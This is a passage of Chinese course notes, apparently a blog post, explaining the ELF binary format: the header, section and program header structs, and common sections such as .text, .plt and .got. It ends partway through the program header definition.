&lt;p&gt;&lt;a href=&#34;https://img-blog.csdnimg.cn/b285b3b11743431d8141594ad4b3f8de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiN5Lya5YaZ5Luj56CB55qE5Lid5Li9,size_20,color_FFFFFF,t_70,g_se,x_16&#34;&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LiN5Lya5YaZ5Luj56CB55qE5Lid5Li9,size_20,color_FFFFFF,t_70,g_se,x_16.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;链接视图与执行时视图&#34;&gt;&lt;a href=&#34;#链接视图与执行时视图&#34; class=&#34;headerlink&#34; title=&#34;链接视图与执行时视图&#34;&gt;&lt;/a&gt;链接视图与执行时视图&lt;/h2&gt;&lt;p&gt;​		elf静态文件是链接视图,当加载到内存后,会有些许变化.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322090941304.png&#34; alt=&#34;image-20230322090941304&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		在链接视图中,节表是必须的,需要根据它来定位各个节,以及保存节的属性,而程序头表则是可选的,程序头表的内容是加载进内存后的属性(&lt;font color=&#34;red&#34;&gt;是否可选要看该文件的类型??&lt;/font&gt;).&lt;/p&gt;
&lt;p&gt;​		在执行视图中,程序头表是必须的,节表就是可选的了.&lt;/p&gt;
&lt;p&gt;​		在静态文件中,有各种不一样的程序的节(section),比如.text节 .bss节,在加载进内存后,&lt;code&gt;加载器&lt;/code&gt;会将相同的节属性（比如只读）合并一个段(segment)&lt;/p&gt;
&lt;h2 id=&#34;ELF文件头-ehdr&#34;&gt;&lt;a href=&#34;#ELF文件头-ehdr&#34; class=&#34;headerlink&#34; title=&#34;ELF文件头 ehdr&#34;&gt;&lt;/a&gt;ELF文件头 ehdr&lt;/h2&gt;&lt;p&gt;​		详细内容:&lt;a href=&#34;https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html&#34;&gt;https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		结构体定义如下&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#define EI_NIDENT 16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef struct &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        unsigned char   e_ident[EI_NIDENT];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_type;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_machine;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Word      e_version;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Addr      e_entry;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Off       e_phoff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Off       e_shoff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Word      e_flags;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_ehsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_phentsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_phnum;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_shentsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_shnum;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Elf32_Half      e_shstrndx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf32_Ehdr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef struct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned char	e_ident[EI_NIDENT];	/* Magic number and other info */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_type;			/* Object file type */ elf文件类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_machine;		/* Architecture */    CPU架构&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Word	e_version;		/* Object file version */  指定ELF版本,一般都为1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Addr	e_entry;		/* Entry point virtual address */  代码运行的入口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Off	e_phoff;		/* Program header table file offset */  程序头表在文件中的偏移&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Off	e_shoff;		/* Section header table file offset */	节头表在文件中的偏移&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Word	e_flags;		/* Processor-specific flags */	在e_machine指定的处理器下的一些特性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_ehsize;		/* ELF header size in bytes */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_phentsize;		/* Program header table entry size */	程序头表每个条目的大小&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_phnum;		/* Program header table entry count */		程序头表中条目的树木&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_shentsize;		/* Section header table entry size */	节头表每个条目的大小&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_shnum;		/* Section header table entry count */		节头表中条目的数量&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Elf64_Half	e_shstrndx;		/* Section header string table index */  每个节都有一个名称,这些名称存储在.shstrtab节中,e_shstrndx指定这个特殊的节所在节头表的下表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf64_Ehdr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		可以用010editor加载插件后清晰的看到结构(需要在templates里面安装和加载一下elf模版)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322094455562.png&#34; alt=&#34;image-20230322094455562&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;e-ident&#34;&gt;&lt;a href=&#34;#e-ident&#34; class=&#34;headerlink&#34; title=&#34;e_ident&#34;&gt;&lt;/a&gt;e_ident&lt;/h3&gt;&lt;p&gt;​		一个16字节大小的数组&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322094613842.png&#34; alt=&#34;image-20230322094613842&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	这个下标范围标错了吧….&lt;/p&gt;
&lt;h2 id=&#34;ELF节表头-shdr&#34;&gt;&lt;a href=&#34;#ELF节表头-shdr&#34; class=&#34;headerlink&#34; title=&#34;ELF节表头 shdr&#34;&gt;&lt;/a&gt;ELF节表头 shdr&lt;/h2&gt;&lt;p&gt;​		e_shoff是 0x19a8(小端)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322100247070.png&#34; alt=&#34;image-20230322100247070&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		可以看到0x19a8开始,存储的是各个节的内容&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322100349315.png&#34; alt=&#34;image-20230322100349315&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		结构如下&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/* Section header.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef struct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_name;        /* Section name (string tbl index) */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_type;        /* Section type */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_flags;       /* Section flags */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Addr  sh_addr;        /* Section virtual addr at execution */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Off   sh_offset;      /* Section file offset */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_size;        /* Section size in bytes */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_link;        /* Link to another section */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_info;        /* Additional section information */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_addralign;       /* Section alignment */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_entsize;     /* Entry size if section holds table */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf32_Shdr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef struct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Word  sh_name;        /* Section name (string tbl index) */ 名称,值是在string表的索引&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Word  sh_type;        /* Section type */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Xword sh_flags;       /* Section flags */  标记属性 读写执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Addr  sh_addr;        /* Section virtual addr at execution */   虚拟地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Off   sh_offset;      /* Section file offset */			在文件中的偏移&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Xword sh_size;        /* Section size in bytes */			大小&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Word  sh_link;        /* Link to another section */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Word  sh_info;        /* Additional section information */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Xword sh_addralign;       /* Section alignment */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Xword sh_entsize;     /* Entry size if section holds table */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf64_Shdr;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;sh-name&#34;&gt;&lt;a href=&#34;#sh-name&#34; class=&#34;headerlink&#34; title=&#34;sh_name&#34;&gt;&lt;/a&gt;sh_name&lt;/h3&gt;&lt;p&gt;​		这里存储的是节名的下标,节名实际存在于.shstrtab中,这里存的是在shstrtab中的下标.&lt;/p&gt;
&lt;h2 id=&#34;节-section&#34;&gt;&lt;a href=&#34;#节-section&#34; class=&#34;headerlink&#34; title=&#34;节 section&#34;&gt;&lt;/a&gt;节 section&lt;/h2&gt;&lt;h3 id=&#34;text节&#34;&gt;&lt;a href=&#34;#text节&#34; class=&#34;headerlink&#34; title=&#34;.text节&#34;&gt;&lt;/a&gt;.text节&lt;/h3&gt;&lt;p&gt;​		保存了程序代码指令的代码节. 一段可执行程序如果存在Phdr, .text字节就会存在于text段中(&lt;font color=&#34;red&#34;&gt;如果不存在呢??&lt;/font&gt;)&lt;/p&gt;
&lt;h3 id=&#34;rodata节&#34;&gt;&lt;a href=&#34;#rodata节&#34; class=&#34;headerlink&#34; title=&#34;.rodata节&#34;&gt;&lt;/a&gt;.rodata节&lt;/h3&gt;&lt;p&gt;​		保存只读数据,如一行c语言代码中的字符串  printf(“hello world\n”); 因为是只读,所以也放到了text段&lt;/p&gt;
&lt;h3 id=&#34;data节&#34;&gt;&lt;a href=&#34;#data节&#34; class=&#34;headerlink&#34; title=&#34;.data节&#34;&gt;&lt;/a&gt;.data节&lt;/h3&gt;&lt;p&gt;​		保存了初始的全局变量等数据.存在于data段&lt;/p&gt;
&lt;h3 id=&#34;bss节&#34;&gt;&lt;a href=&#34;#bss节&#34; class=&#34;headerlink&#34; title=&#34;.bss节&#34;&gt;&lt;/a&gt;.bss节&lt;/h3&gt;&lt;p&gt;​		保存了未进行初始化的全局数据,存在于data段.&lt;/p&gt;
&lt;h3 id=&#34;plt&#34;&gt;&lt;a href=&#34;#plt&#34; class=&#34;headerlink&#34; title=&#34;.plt&#34;&gt;&lt;/a&gt;.plt&lt;/h3&gt;&lt;p&gt;​		包含了动态链接器调用从共享库导入的函数所必需的相关代码. 存在于text段中,同样保存了代码.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230303132136453.png&#34; alt=&#34;image-20230303132136453&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;got&#34;&gt;&lt;a href=&#34;#got&#34; class=&#34;headerlink&#34; title=&#34;.got&#34;&gt;&lt;/a&gt;.got&lt;/h3&gt;&lt;p&gt;​		保存了全局偏移表.这个存的是变量&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230228164021947.png&#34; alt=&#34;image-20230228164021947&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;got-plt&#34;&gt;&lt;a href=&#34;#got-plt&#34; class=&#34;headerlink&#34; title=&#34;.got.plt&#34;&gt;&lt;/a&gt;.got.plt&lt;/h3&gt;&lt;p&gt;​		这个存的是函数引用&lt;/p&gt;
&lt;h3 id=&#34;dynsym&#34;&gt;&lt;a href=&#34;#dynsym&#34; class=&#34;headerlink&#34; title=&#34;.dynsym&#34;&gt;&lt;/a&gt;.dynsym&lt;/h3&gt;&lt;p&gt;​		保存了从共享库导入的动态符号信息,该节保存在text段中&lt;/p&gt;
&lt;h3 id=&#34;dynstr&#34;&gt;&lt;a href=&#34;#dynstr&#34; class=&#34;headerlink&#34; title=&#34;.dynstr&#34;&gt;&lt;/a&gt;.dynstr&lt;/h3&gt;&lt;p&gt;​		保存了动态符号字符串表,表中存放了一系列字符串,这些字符串表示符号的名称,以空字符00作为终止符&lt;/p&gt;
&lt;h2 id=&#34;ELF程序头-phdr-segment段&#34;&gt;&lt;a href=&#34;#ELF程序头-phdr-segment段&#34; class=&#34;headerlink&#34; title=&#34;ELF程序头 phdr (segment段)&#34;&gt;&lt;/a&gt;ELF程序头 phdr (segment段)&lt;/h2&gt;&lt;p&gt;​		程序头中描述了可执行文件的段信息,即程序如何加载到内存以及内存中的布局.&lt;/p&gt;
&lt;p&gt;​		程序头可以通过elf文件头的e_phoff（程序头表偏移量）字段来得到位置&lt;/p&gt;
&lt;p&gt;​		它主要有5种类型&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* Program segment header.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  p_type;         &lt;span class=&#34;comment&#34;&gt;/* Segment type */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Off   p_offset;       &lt;span class=&#34;comment&#34;&gt;/* Segment file offset */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Addr  p_vaddr;        &lt;span class=&#34;comment&#34;&gt;/* Segment virtual address */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Addr  p_paddr;        &lt;span class=&#34;comment&#34;&gt;/* Segment physical address */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  p_filesz;       &lt;span class=&#34;comment&#34;&gt;/* Segment size in file */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  p_memsz;        &lt;span class=&#34;comment&#34;&gt;/* Segment size in memory */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  p_flags;        &lt;span class=&#34;comment&#34;&gt;/* Segment flags , I.E execute|read|write */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  p_align;        &lt;span class=&#34;comment&#34;&gt;/* Segment alignment */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf32_Phdr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Word	p_type;    &lt;span class=&#34;comment&#34;&gt;//类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Word	p_flags;   &lt;span class=&#34;comment&#34;&gt;// 读写执行权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Off	p_offset;   &lt;span class=&#34;comment&#34;&gt;//文件中的偏移&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Addr	p_vaddr;  